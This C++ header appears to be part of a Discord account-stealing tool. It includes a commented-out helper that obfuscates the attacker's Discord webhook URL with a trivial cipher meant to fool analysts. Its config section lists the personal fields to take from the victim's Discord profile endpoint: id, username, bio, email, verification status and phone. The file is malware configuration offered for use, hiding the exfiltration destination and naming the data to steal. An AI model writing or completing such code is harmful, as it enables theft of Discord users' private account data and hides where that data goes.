#pragma once
#include <vector>
#include <string>

namespace hentai
{
	std::string uwu(std::string burp);
	// You can use this function to encode your discord webhook
	// std::vector woow(std::string burp);
	//{
	//	std::vector<char> boobs;
	//	for (unsigned int i = 0; i < burp.size(); ++i)
	//	{
	//		if (i % 2 == 0)
	//			boobs.push_back(burp.at(i) + 3);
	//		else
	//			boobs.push_back(burp.at(i) - 3);

	//	}
	//
	//	boobs.push_back('\0');
	//	return boobs;
	//}

}

namespace config
{
	// Discord Webhook URL
	// Use the above function to encode your web hook url
	// I know its pretty basic cipher but works against noobs
	// Enter your encoded bytes here
	// Let the null char be at the end to terminate the string
	const char encoded_webhook[] = {'\0'};

	// Data to be extracted from https://discord.com/api/v9/users/@me
	const std::vector<std::string> useful_data{"id", "username", "bio", "email", "verified", "phone"};

}
